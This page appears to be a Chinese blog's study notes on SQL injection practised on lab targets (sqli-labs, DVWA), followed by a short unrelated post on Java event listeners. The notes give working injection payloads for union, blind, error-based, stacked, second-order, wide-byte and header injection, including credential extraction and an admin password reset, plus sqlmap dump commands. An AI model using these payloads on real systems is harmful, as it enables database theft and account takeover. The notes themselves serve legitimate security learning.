<p>?id=0 union select 1,database(),group_concat(column_name) from information_schema.columns where table_schema=’test’ and table_name=’users’</p>
<p>查询出所有列名</p>
<p>如果只能看一个就可通过limit进行查阅</p>
<p>?id=0 union select 1,database(),column_name from information_schema.columns where table_schema=’test’ and table_name=’users’ limit 1,1</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> tableName <span class="keyword">limit</span> i,n</span><br><span class="line"><span class="comment"># tableName：表名</span></span><br><span class="line"><span class="comment"># i：为查询结果的索引值(默认从0开始)，当i=0时可省略i</span></span><br><span class="line"><span class="comment"># n：为查询结果返回的数量</span></span><br><span class="line"><span class="comment"># i与n之间使用英文逗号","隔开</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="keyword">limit</span> n 等同于 <span class="keyword">limit</span> <span class="number">0</span>,n</span><br></pre></td></tr></table></figure>
<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><p>?id=0 union select 1,database(),username from users limit 0,1 //或使用group_concat()</p>
<h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><p>判断是否存在sql注入</p>
<ul>
<li><p>通过单引号进行查找 </p>
<p>？id=114’</p>
<p>单引号破坏了原来sql语句的语法，并报错。确定114’被采用拼接方式带入了数据库执行</p>
<p>—+注释掉后面的单引号 +在url中是空格的意思</p>
</li>
<li><p>当加减法对页面没有影响时，说明不是数字型的注入</p>
</li>
<li><p>通过sleep判断sql注入是否存在</p>
<p>?id=114 and sleep(10)</p>
<p>通过f12查询所需时间发现没有影响，说明可能把114后内容舍弃了</p>
</li>
</ul>
<p>确定注入字段数</p>
<ul>
<li>通过order by </li>
<li>?id=114’order by +字段数</li>
</ul>
<p>联合查询</p>
<ul>
<li><p>通过编码方式绕过关键字过滤</p>
</li>
<li><p>查询数据库版本 5.0以下不能使用information_schema</p>
</li>
<li><p>查找出当前数据库</p>
</li>
<li><p>查找出所有表</p>
<p>?id=114’ union select 1,2,table_name,4,5,6 from information_schema.tables where table_schema=’interali_project’—+</p>
<p>可以通过group_concat将查询结果连接在一起</p>
</li>
<li><p>获取相关表的字段名</p>
<p>?id=114’ union select 1,2,column_name,4,5,6 from information_schema columns where table_schema=’interali_project’ and table_name=’usertable’—+</p>
</li>
<li><p>获取字段下的数据</p>
<p>?id=114’ union select 1,2,username,4,5,6 from usertable—+</p>
</li>
</ul>
<h1 id="21-、22-布尔盲注"><a href="#21-、22-布尔盲注" class="headerlink" title="21 、22 布尔盲注"></a>21 、22 布尔盲注</h1><h2 id="手工注入过程"><a href="#手工注入过程" class="headerlink" title="手工注入过程"></a>手工注入过程</h2><p>1.获取数据库名字长度</p>
<p>?id=1’ and (length(datebase()))—+</p>
<p>?id=1’ and (length(database()))&gt;5—+</p>
<p>2.获取数据库名字</p>
<p>?id=1’ and ascii(substr(database(),1,1))&gt;100—+</p>
<p>//排序除limit外，都从1开始</p>
<p>使用burp的intruder模块遍历</p>
<p>3.获取表的数量</p>
<p>?id=1’ and (select count(*) from information_schema.tables where table_schema=database())&gt;5—+</p>
<p>4.获取表名的长度</p>
<p>?id=1’ and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1//只获取第一个表名)&gt;5—+</p>
<p>通过limit获取每张表表名的长度</p>
<p>5.获取表的名字</p>
<p>?id=1’ and (select ascii(substr(table_name,1,1) from information_schema.tables where table_shcema=database() limit 0,1)&gt;100—+ </p>
<p>6.获取列名的数量</p>
<p>?id=1’ and (select count(column_name) from information_schema.columns  where table_schema=databse() and table_name=’emails’)&gt;5—+</p>
<p>7.获取列名的长度</p>
<p>?id =1’ and (select length(column_name) from information_schema.columns where table_schema=database() and table_name=’emails’ limit 0,1)&gt;2—+</p>
<p>8.获取列的名字</p>
<p>?id=1’ and (select ascii(substr(column_name,1,1)) from information_schema.columns where table_schema=database() and table_name=’emails’ limit 0,1)&gt;100—+</p>
<p>9.获取表中的数据</p>
<p>获取数据</p>
<p>?id=1’ and ascii(substr((select id from emails limit 0,1),1,1))=49—+</p>
<p>?id=1’ and ascii(substr((select id from emails limit 1,1),1,1))=50—+</p>
<p>…….</p>
<h2 id="使用burpsuite"><a href="#使用burpsuite" class="headerlink" title="使用burpsuite"></a>使用burpsuite</h2><p>进行抓包-&gt; Intruder-&gt;Positions(目标)-&gt;Sniper(狙击模式)-&gt;clear 去掉默认加的变量符-&gt;把需要猜测的ascii值加上变量符 $114$ -&gt;设置Payload payload set=1 payload type=Numbers -&gt;选择sequential(顺序)或random,from 0 to 127,step=1-&gt;start</p>
<p>最好使用等于号，而不是大于号小于号，使结果一目了然，只有一个</p>
<h1 id="23-时间盲注"><a href="#23-时间盲注" class="headerlink" title="23  时间盲注"></a>23  时间盲注</h1><p>通过时间变化判断sql语句是否被成功地执行</p>
<h2 id="判断id数据类型成功执行sql语句"><a href="#判断id数据类型成功执行sql语句" class="headerlink" title="判断id数据类型成功执行sql语句"></a>判断id数据类型成功执行sql语句</h2><p>?id=1’ and sleep(10)—+</p>
<p>加载10s以上  查看方法:f12-&gt;Network 看到整个请求完成的时间</p>
<p>假设id是数字型 ?id=1 and if(1=1,sleep(5),1)//若1=1，sleep(5);else,返回1</p>
<p>没有延时，假设是字符型</p>
<p>?id=1’ and if(1=1,sleep(5),1)—+//若1=1，sleep(5);else</p>
<p>有延时，说明id是字符型</p>
<h2 id="进行盲注"><a href="#进行盲注" class="headerlink" title="进行盲注"></a>进行盲注</h2><p>示例:?id=1’ and if(&gt;123,sleep(5),1)—+</p>
<p>获取数据库版本号</p>
<p>?id=1’ and if(ascii(mid((select version()),1,1//字符串截取函数,类似于substr))&gt;50),sleep(5),1)—+ </p>
<p>?id=1’ and if(ascii(mid((select table_name from information_schema.tables),1,1))&gt;50),sleep(5),1)—+ </p>
<h1 id="24-floor报错注入原理"><a href="#24-floor报错注入原理" class="headerlink" title="24 floor报错注入原理"></a>24 floor报错注入原理</h1><p>十种MySQL报错注入</p>
<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>1.rand()产生伪随机数的数列 随机产生0-1中间的数</p>
<p>rand(seed)</p>
<p>2.count(*)</p>
<p>select count(*) from floortest 查询表下有多少列</p>
<p>3.group by 分组</p>
<p>select * from floortest group by name</p>
<p>以name列为基准分组 name下重复的归到一组</p>
<p>select count(*),name from floortest group by name</p>
<p>4.floor()</p>
<p>向下取整  floor(2.99) -&gt; 2</p>
<p> rand(0) seed=0 整条语句结果是固定的随机数</p>
<p>select floor(rand(0)*2);  -&gt; 0</p>
<p>select floor(rand(0)*2) from floortest; -&gt;产生0和1两种结果</p>
<p>5.count(*)+group by创建虚拟表</p>
<p>会根据数据的需要，临时建立一个虚拟表，来进行计数</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>key</th>
<th>count（*）</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
</tr>
</tbody>
</table>
</div>
<p>查询时 先查询表中key有无此数据，若没有，插入这个数据；若有，+1</p>
<p>第一个数为0  查询虚拟表中没有 插入floor(rand(0)*2) 语句再执行一次 变为1 所以插入key=1</p>
<p>第二个数为1 查询表中有1 count=1+1</p>
<p>第三个数为0 查询虚拟表中没有 插入floor(rand(0)*2) 又变为1 </p>
<p>此时报错 Duplicate entry’1’ for key’group_key’</p>
<p> //键’group_key’的重复条目’1’</p>
<p>select count(<em>),concat(user(),floor(rand(0)\</em> 2)) from floortest group by concat(user(),floor(rand(0)*2))</p>
<p>select count(<em>),concat(user(),floor(rand(0)\</em>2))x from floortest group by x  //给concat(user(),floor(rand(0)*2))设置别名x，直接用x代表</p>
<p>若不知道表名可以使用</p>
<p>select count(<em>),concat(user(),floor(rand(0)\</em>2))x from information_schema.tables group by x</p>
<p>由于上面的语句查询出来的结果是一张表，必须将其变为具体数值(true false)才能与and进行操作，只能是布尔值，需要在嵌套一次查询</p>
<p>select <em> from floortest where id=1 and **(select 1 from(select count(</em>),concat(user(),floor(rand(0)*2))) x from information_schema.tables group by x)a);**</p>
<p>需要给(select count(<em>),concat(user(),floor(rand(0)\</em>2))) x from information_schema.tables group by x)表添加一个别名a</p>
<h1 id="25-floor报错注入利用演示"><a href="#25-floor报错注入利用演示" class="headerlink" title="25 floor报错注入利用演示"></a>25 floor报错注入利用演示</h1><p>查询数据库名</p>
<p>?id=1’) and(select 1 from(select count(<em>),concat(database(),floor(rand(0)</em>2))a from information_schema.tables group by a)x)—+</p>
<p>>‘security1’</p>
<p>查询表名</p>
<p>?id=1’) and (select 1 from(select count(<em>),concat(==(select table_name from information_schema.tables where table_schema=’security’ limit 0,1)==，floor(rand(0)\</em>2))a from information_schema.tables group by a)x)—+</p>
<p>查询列名</p>
<p>?id=1’) and (select 1 from(select count(<em>),concat(==(select column_name from information_shcema.columns where table_schema=’security’ and table_name=’users’ limit 0,1)==，floor(rand(0)\</em>2))a from information_schema.tables group by a)x)—+</p>
<p>查询到两列 username和password</p>
<p>查询数据</p>
<p>?id=1’) and (select 1 from(select count(<em>),concat(==(select username from users  limit 0,1)==，floor(rand(0)\</em>2))a from information_schema.tables group by a)x)—+</p>
<p>?id=1’) and (select 1 from(select count(<em>),concat(==(select password from users  limit 0,1)==，floor(rand(0)\</em>2))a from information_schema.tables group by a)x)—+</p>
<h1 id="26-extractvalue-和updatexml-报错注入"><a href="#26-extractvalue-和updatexml-报错注入" class="headerlink" title="26 extractvalue()和updatexml()报错注入"></a>26 extractvalue()和updatexml()报错注入</h1><h2 id="报错原理"><a href="#报错原理" class="headerlink" title="报错原理"></a>报错原理</h2><p>extractvalue()有两个参数</p>
<p>updatexml()有三个参数</p>
<p>两个函数都是在第二个位置的参数上进行修改注入</p>
<p>这两个函数都是用来处理xml文档的</p>
<p>报错都是xml语法错误</p>
<p>只要两个函数的第二个参数不符合xml语法，就会发生报错</p>
<p>?id=1’ and (updatexml(1,concat(0x7e,(select database()),0x7e),1))—+</p>
<p>?id=1’ and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’security ‘ limit 0,1),0x7e),1))—+</p>
<p>通过两个函数查询时需注意：查询数据长度限制在32位之内，如果超过32位</p>
<p>可以使用left() right() substr() 通过截取长度分段显示出来</p>
<h1 id="26-堆叠注入"><a href="#26-堆叠注入" class="headerlink" title="26 堆叠注入"></a>26 堆叠注入</h1><p>利用;隔开</p>
<p>和union注入的区别</p>
<p>and 1=1—+成立 and 1=2— +不成立来判断是否可以注入</p>
<p>order by 判断字段数 ==？==</p>
<p>?id=-888’ union select 1,2,3==?把888注释掉==</p>
<p>?=id=-888‘ union select 1,2,3;select sleep(5)—+</p>
<p>?=id=-888‘ union select ‘~‘,database(),’~’—+</p>
<p>?=id=-888‘ union select ‘~‘,table_name,’~’ from information_schema.tables where table_schema=’test’—+</p>
<p>?=id=-888‘ union select ‘~‘,column_name,’~’ from information_schema.columns where table_schema=’test’ and table_name=’floor_test’—+</p>
<p>更改数据</p>
<p>?id=-888’;update floortest set name=’change’ where id=6 —+</p>
<p>还可以进行delect/插入操作</p>
<p>原理：php使用PDO编译，存在堆叠注入，可以执行多条sql语句</p>
<p>union注入只能进行查询操作</p>
<h1 id="27-二次注入"><a href="#27-二次注入" class="headerlink" title="27 二次注入"></a>27 二次注入</h1><p>攻击者在注册的地方构造恶意的sql语句，提交到服务器储存到数据库中</p>
<p>注册 username:admin’# password:123456</p>
<p>修改admin’#的密码</p>
<p>查看数据库发现admin’#密码未被改变 而admin密码改变</p>
<p>原理：</p>
<p>修改密码源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"UPDATE users SET PASSWORD='$pass' where username='admin'#' and password='$curr_pass'"</span>;</span><br></pre></td></tr></table></figure>
<p>实际修改了admin的密码 并且’ and password=’$curr_pass’被注释了</p>
<p>这样就可以实现随意指定用户名而不用知道他的密码 修改其密码</p>
<h1 id="28-宽字节注入"><a href="#28-宽字节注入" class="headerlink" title="28 宽字节注入"></a>28 宽字节注入</h1><p>一.什么是宽字节注入</p>
<p>宽字节注入是因为gbk编码方式需要两个ascii码组合来解码，所以形象的叫做宽字节</p>
<p>二.宽字节注入的条件</p>
<p>1)数据库查询设置为GBK编码</p>
<p>2)addslashes(),mysql_real_escape_string(),mysql_escape_string()这类的过滤函数(会对输入的字符串产生过滤操作)</p>
<p>两条同时满足</p>
<p>三、原理</p>
<p>假设我们传递一个参数id=1’ 会被认为单引号是不合法的，会被过滤函数添加转义”\”给过滤掉。要想程序接受我们传递的参数中包含单引号，就需要把转义字符给干掉</p>
<p>当http协议传输时，要经过url编码的（空格变为%20，单引号变为 %27），如果这个编码完成后，传递到服务器，==有奇数个数==（有奇数个url编码），它会把前边偶数个数的字符当gbk编码去解码，那么剩下的就当普通的url去解码，所以我们就可以在单引号之前添加一个%81这样的编码，这样到最后解码的时候，这个%81就会和”\”对应的编码相结合按照gvk的要求去解码，最后就只剩下个单引号。</p>
<p>四、实例</p>
<p>%5c表示反斜杠</p>
<p>?id=1’</p>
<p>提交过后 1%5c%27</p>
<p>?id=1%81’</p>
<p>提交过后 1%81%5c%27</p>
<p>由于gbk编码特性,%81%5c组合，%27解码成单引号</p>
<p>发生报错，说明成功干扰，%81%5c解码成中文</p>
<p>按照正常流程进行注入</p>
<p>进行union,order by下一步操作</p>
<p>?id=1%81’ union select 1,2,3—+</p>
<p>页面不显示，如果想将联合查询的内容显示到页面上</p>
<p>?id=-1%81’ union select 1,2,3—++</p>
<p>前面的-1查询不到，就会把后面的内容显示到页面上</p>
<p>在2,3位置查询user() database()</p>
<p>进行后续系列操作</p>
<p>注意：table_schema=’security’又被转义，这时不能通过宽字节注入，因为对应的数据库名前对加上汉字，可以转换字符串为对应的十六进制0x+就可以解决问题</p>
<p>五、其他</p>
<p>若想将网页修改为gbk编码方式：更多-&gt;文字编码-&gt;简体中文</p>
<p>gbk编码是由两个ascii字符来解码的，gbk编码汉字是从%81开始的</p>
<p>从81开始都可以到FE结束，都可以达到编码效果</p>
<h1 id="29-UserAgent、Referer、Cookie注入"><a href="#29-UserAgent、Referer、Cookie注入" class="headerlink" title="29 UserAgent、Referer、Cookie注入"></a>29 UserAgent、Referer、Cookie注入</h1><p>注入点不仅存在与get/post传参，请求包头部字段user-agent/referer/cookie/x-forwarded-for(头部字段名)都有可能发生sql注入</p>
<h3 id="user-agent注入"><a href="#user-agent注入" class="headerlink" title="user-agent注入"></a>user-agent注入</h3><p>使用burp抓包分析请求报文</p>
<p>将抓到的post请求包发送到repeater模块</p>
<p>通过更改User-agent的值查看页面回显</p>
<p>user-agent:aaa’ 使用闭合单引号发现出现报错，干扰了正常的sql语句</p>
<p>构造报错注入相关语句</p>
<p>使用—+和#都报错说明注释可能无法使用，改为</p>
<p>user-agent:aaaa’ and ‘1’=’1</p>
<p>使用常见的三种报错函数进行报错注入</p>
<p>user-agent: aaa’ and extractvalue(1,concat(0x7e,(select user()),0x7e)) and ‘1’=’1</p>
<p>后续进行sql注入</p>
<p><strong>select @@basedir为安装路径查询</strong></p>
<h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>Cookie:uname=admin</p>
<p>Cookie:uname=admin’ 产生报错</p>
<p>Cookie:uname=admin’ and ‘1’=’1</p>
<p>Cookie:uname=admin; and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))</p>
<p>注意：取出数据的长度最多三十二位，如果想要完整显示出来，需要使用字符串截取函数分段显示出来</p>
<h1 id="30-通过注入漏洞获取账号密码登录后台网站"><a href="#30-通过注入漏洞获取账号密码登录后台网站" class="headerlink" title="30 通过注入漏洞获取账号密码登录后台网站"></a>30 通过注入漏洞获取账号密码登录后台网站</h1><p>?id=1’ 页面发生变化，变为空白</p>
<p>?id=1’—+ 页面保持空白，说明此处id类型不是字符型</p>
<p>?id=1 and 1=1 页面正常显示</p>
<p>这时看?id=1 and 1=2 若也正常显示，说明此处不存在注入点；不正常显示，判断为数字型的sql注入</p>
<p>?id=-1 union select 1,2,3,4</p>
<p>查出字段后 将查询值改为查不到的数值可以看到字段在哪里回显</p>
<h1 id="31-sqlmap简介与使用"><a href="#31-sqlmap简介与使用" class="headerlink" title="31 sqlmap简介与使用"></a>31 sqlmap简介与使用</h1><p>sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，采用四种SQL注入技术：union注入，堆叠注入，报错注入，时间盲注，布尔盲注</p>
<p>sqlmap基于python2.7</p>
<h3 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h3><p><strong>判断是否存在注入</strong></p>
<p>①sqlmap -u <a href="http://193.112.113.137/sqlilbs/less-1?id=1" target="_blank" rel="noopener">http://193.112.113.137/sqlilbs/less-1?id=1</a></p>
<p>弹出it looks like the back-end DBMS is “MySQL”.Do you want to skip test payloads specific for other DBMSes?进行交互</p>
<p>(数据库可能是MySQL数据库，是否跳过检测其他数据库)</p>
<p>for the remaining tests,do you want to include all tests for ‘MySQL’ extending provided level(1) and risk(1) values?</p>
<p>(在level(1) and risk(1)情况下，是否使用Mysql所有的payload进行检测，默认即可)</p>
<p>②使用burpsuite抓包</p>
<p>将请求(Request-Raw)复制到kali中</p>
<p>创建文本文件vim sqlcheck.txt</p>
<p>sqlmap -r sqlcheck.txt</p>
<p>效果和①相同</p>
<p>当payload只有Id一个参数时不用加双引号，当有两个参数时，sqlmap -u “<a href="http://193.112.113.137/sqlilabs/less-1?id=1&amp;uid=1" target="_blank" rel="noopener">http://193.112.113.137/sqlilabs/less-1?id=1&amp;uid=1</a>“ 使用＆并添加双引号</p>
<p><strong>查询当前用户下所有数据库</strong></p>
<p>sqlmap -u <a href="http://193.112.113.137/sqlilabs/less-1?id=1" target="_blank" rel="noopener">http://193.112.113.137/sqlilabs/less-1?id=1</a> —dbs</p>
<p><strong>获取某个数据库中的表名</strong></p>
<p>sqlmap -u <a href="http://193.112.113.137/sqlilabs/less-1?id=1" target="_blank" rel="noopener">http://193.112.113.137/sqlilabs/less-1?id=1</a> -D(指定获取哪一个数据库中的表名) security —tables(获取security数据库中所有表名)</p>
<p><strong>获取某张表中的字段名</strong></p>
<p>sqlmap -u <a href="http://193.112.113.137/sqlilabs/less-1?id=1" target="_blank" rel="noopener">http://193.112.113.137/sqlilabs/less-1?id=1</a> -D(指定获数据库来定位)security -T users —columns</p>
<p><strong>获取字段里的数据</strong></p>
<p>sqlmap -u <a href="http://193.112.113.137/sqlilabs/less-1?id=1" target="_blank" rel="noopener">http://193.112.113.137/sqlilabs/less-1?id=1</a> -D(指定获数据库来定位)security -T users -C id,username,password</p>
<p>—dump</p>
<p>需要获取的字段通过逗号连接 id,username,password</p>
<h1 id="32-sqlmap自动化注入实战"><a href="#32-sqlmap自动化注入实战" class="headerlink" title="32 sqlmap自动化注入实战"></a>32 sqlmap自动化注入实战</h1><p>首先判断注入点是否存在</p>
<p>sqlmap -u url</p>
<p>如果不确定注入点是否在get方式，可以把http请求保存到文本，sqlmap -r 在文本中读取http请求进行测试</p>
<p>读取当前所有数据库 —dbs</p>
<p>查看当前的数据库 sqlmap -u url —current -db</p>
<p>获取数据库中所有表</p>
<p>sqlmap -u url -D nonoi_col(数据库名) —tables</p>
<p>获取表里的字段</p>
<p>sqlmap -u url -D nonoi_col(数据库名) -T cat(表名) —columns</p>
<p>获取数据</p>
<p>sqlmap -u url -D nonoi_col -T cat -C cat_name,cid —dump</p>
<p>如果直接使用—dump</p>
<p>sqlmap -u url —dump</p>
<p> 自动把所有数据库中所有表给读取出来</p>
<p>并对相应的哈希值进行暴力破解</p>
<h1 id="33-sqlmap的使用以及load-file-读取目标系统文件"><a href="#33-sqlmap的使用以及load-file-读取目标系统文件" class="headerlink" title="33 sqlmap的使用以及load_file()读取目标系统文件"></a>33 sqlmap的使用以及load_file()读取目标系统文件</h1><h2 id="sqlmap连接需要登录的页面"><a href="#sqlmap连接需要登录的页面" class="headerlink" title="sqlmap连接需要登录的页面"></a>sqlmap连接需要登录的页面</h2><p>ipconfig查询本地ip</p>
<p>sqlmap -u “<a href="http://172.20.10.2/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" target="_blank" rel="noopener">http://172.20.10.2/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#</a>“ —dbs</p>
<p>会显示sqlmap got a 302 redirect to ‘…’ 进行重定向</p>
<p>如果换一个浏览器，访问上述地址会首先判断是否登陆过系统</p>
<p>如果没有登录，就会跳转到登录页面登录</p>
<p>如果使用sqlmap遇到这种需要登录才能访问的页面，直接点击回车是不会测出任何结果</p>
<p>我们需要得到对应Cookie，获取cookie的几种方式</p>
<p>①f12-&gt;console(控制台)-&gt;输入js语句 document.cookie</p>
<p>会把当前用户的cookie信息打印下来</p>
<p>②burp抓包获取cookie</p>
<p>burp获取到的请求报文复制</p>
<p>vim cookie.txt(新建一个txt) 保存请求报文</p>
<p>sqlmap -r cookie.txt —dbs</p>
<p>也可以达到同样的效果</p>
<p>sqlmap -u “<a href="http://172.20.10.2/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" target="_blank" rel="noopener">http://172.20.10.2/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#</a>“ —cookie=””  —dbs</p>
<h2 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h2><p>1.查看正在连接的数据库</p>
<p>sqlmap -r cookie.txt —current-db</p>
<p>2.获取数据库用户的密码</p>
<p>sqlmap -r cookie.txt —passwords</p>
<p>列举出用户和密码哈希值 接着破解密码的哈希值</p>
<p>3.获取当前数据库的用户名称</p>
<p>sqlmap -r cookie.txt —current-user</p>
<p>4.判断当前用户是否为管理权限</p>
<p>sqlmap -r cookie.txt —is-dba</p>
<p>如果 DBA:True,说明有管理权限</p>
<p>5.测试等级 —level</p>
<p>分为五个等级</p>
<p>如果平时不加等级，默认的等级为 —level 1</p>
<p>6.whereis sqlmap查看sqlmap所在目录 </p>
<p>-&gt; cd  /usr/share/sqlmap </p>
<p>-&gt; cd xml/</p>
<p>-&gt; ls</p>
<p>-&gt;cd payloads</p>
<p>所有测试的payload都存储在该路径下的xml文件下，如果有自己想加入的测试路径，可以加入进来</p>
<p>如果使用—level 5是级别最高的，使用的payload最多的，会对自动破解Cookie,xff头部注入进行测试</p>
<p>运行速度很慢，最好不用使用最高等级</p>
<p>—level 2时会测试cookie相应注入</p>
<p>—level 3会测试 useragent </p>

      
    </div>
    
      
    
  </section>
</article>

          </div>
        
      
        
          <div class='post-wrapper'>
            <article class="post white-box shadow reveal ">
  


  <section class='meta'>
    
      
      
      <div class="meta" id="header-meta">
        
          
  <h2 class="title">
    <a href="/2020/11/30/java3/">
      java学习(3)
    </a>
  </h2>


        
        <div class='new-meta-box'>
          
            
          
            
              
<div class='new-meta-item author'>
  <a href="" rel="nofollow">
    <img src="https://ae01.alicdn.com/kf/H68ac7f1be81b4260813ba8136aef8160J.jpg">
    <p>omp</p>
  </a>
</div>

            
          
            
              
  
  <div class='new-meta-item category'>
    <a href='/categories/java/' rel="nofollow">
      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
      <p>java</p>
    </a>
  </div>


            
          
            
              <div class="new-meta-item date">
  <a class='notlink'>
    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
    <p>发布于：Nov 30, 2020</p>
  </a>
</div>

            
          
            
              

            
          
            
              
  <div class="new-meta-item browse valine">
    <a class='notlink'>
      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
      <span id="/2020/11/30/java3/" class="leancloud_visitors" data-flag-title="java学习(3)">
      <p>
        <span class="leancloud-visitors-count"></span>
      </p>
      </span>
    </a>
  </div>


            
          
            
          
            
          
            
              

            
          
        </div>
        
          <hr>
        
      </div>
    
  </section>


  <section class="article typo">
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h1><h2 id="监听类"><a href="#监听类" class="headerlink" title="监听类"></a>监听类</h2><p>==监听类的四种选择==</p>
<ol>
<li><strong>选择本类</strong></li>
<li><strong>定义一个实现了接口XXXListener的新类作为监听类</strong></li>
<li><strong>定义一个继承于相应适配器类的新类作为监听类</strong></li>
<li><strong>匿名类 </strong></li>
</ol>
<h3 id="本类监听"><a href="#本类监听" class="headerlink" title="本类监听"></a>本类监听</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFrame</span> <span class="keyword">extends</span> <span class="title">JFrame</span> <span class="keyword">implements</span> <span class="title">XXXListener</span></span>&#123;</span><br><span class="line">    MyFrame()&#123;</span><br><span class="line">        组件名.addXXXListener(**<span class="keyword">this</span>**);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent arg0)</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="定义一个实现接口的新类作为监听类"><a href="#定义一个实现接口的新类作为监听类" class="headerlink" title="定义一个实现接口的新类作为监听类"></a>定义一个实现接口的新类作为监听类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFrame</span> <span class="keyword">extends</span> <span class="title">JFrame</span></span>&#123;</span><br><span class="line">    MyListener listener = <span class="keyword">new</span> MyListener(<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">//想传递谁就把相应组件放在括号中</span></span><br><span class="line">    组件名.addXXXListener(listener);</span><br><span class="line">    <span class="comment">//监听类对象</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyListener</span> <span class="keyword">implements</span> <span class="title">XXXListener</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>==只要类声明实现接口，就必须重写定义接口的方法==</p>
<p>==若只想使用其中一个，其他的方法也不能删去==</p>
<h3 id="定义一个继承于相应适配器类的新类作为监听类"><a href="#定义一个继承于相应适配器类的新类作为监听类" class="headerlink" title="定义一个继承于相应适配器类的新类作为监听类"></a>定义一个继承于相应适配器类的新类作为监听类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFrame</span> <span class="keyword">extends</span> <span class="title">JFrame</span></span>&#123;</span><br><span class="line">    MyFrame()&#123;</span><br><span class="line">    MyListener listener = <span class="keyword">new</span> MyListener(<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">//想传递谁就把相应组件放在括号中</span></span><br><span class="line">    组件名.addXXXListener(listener);</span><br><span class="line">    <span class="comment">//监听类对象</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;		</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyListener</span> <span class="keyword">extends</span> <span class="title">XXXAdapter</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>与接口类不同的是，如果想处理某一方法，就在新类中重写这个方法</p>
<h3 id="选择匿名类作为监听类（最常见）"><a href="#选择匿名类作为监听类（最常见）" class="headerlink" title="选择匿名类作为监听类（最常见）"></a>选择匿名类作为监听类（最常见）</h3><h5 id="依赖于相应接口创建匿名类"><a href="#依赖于相应接口创建匿名类" class="headerlink" title="依赖于相应接口创建匿名类"></a>依赖于相应接口创建匿名类</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFrame</span> <span class="keyword">extends</span> <span class="title">JFrame</span></span>&#123;</span><br><span class="line">    MyFrame()&#123;</span><br><span class="line">    组件名.addXXListener(<span class="keyword">new</span> XXXListener()&#123;</span><br><span class="line">        <span class="comment">//重写XXListener接口中定义的所有方法</span></span><br><span class="line">    &#125;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>new A类(){}表明了创建这个A类的子类（匿名类）的实例对象</p>
<p>new I接口(){}表明创建了一个匿名类实例，这个类是声明实现I接口的</p>
<p>new 接口(){}不是创建接口实例，接口是不能创建实例的</p>
